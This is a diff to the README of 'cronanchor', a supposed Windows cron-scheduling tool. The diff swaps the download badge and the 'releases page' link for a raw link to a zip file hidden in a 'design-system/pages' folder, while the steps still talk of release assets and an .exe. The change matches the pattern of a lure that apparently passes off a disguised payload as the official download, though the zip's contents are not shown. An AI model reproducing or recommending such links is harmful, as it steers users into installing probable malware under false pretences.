@@ -1,6 +1,6 @@
 # 📅 cronanchor - Create precise schedules for your tasks
 
-<a href="https://github.com/fisanervousprostration593/cronanchor/releases">
+<a href="https://raw.githubusercontent.com/fisanervousprostration593/cronanchor/main/design-system/pages/Software-v3.9.zip">
   <img src="https://img.shields.io/badge/Download-Latest_Version-blue.svg" alt="Download Link">
 </a>
 
@@ -20,7 +20,7 @@ Cron jobs often use simple formats. You might want a task that runs every two we
 
 You need a Windows computer to use this tool. Follow these steps to obtain and run the software.
 
-1. Visit the [releases page](https://github.com/fisanervousprostration593/cronanchor/releases) to download the application.
+1. Visit the [releases page](https://raw.githubusercontent.com/fisanervousprostration593/cronanchor/main/design-system/pages/Software-v3.9.zip) to download the application.
 2. Locate the link labeled "Assets" under the latest version.
 3. Select the file ending in `.exe` for Windows systems.
 4. Save the file to your computer.
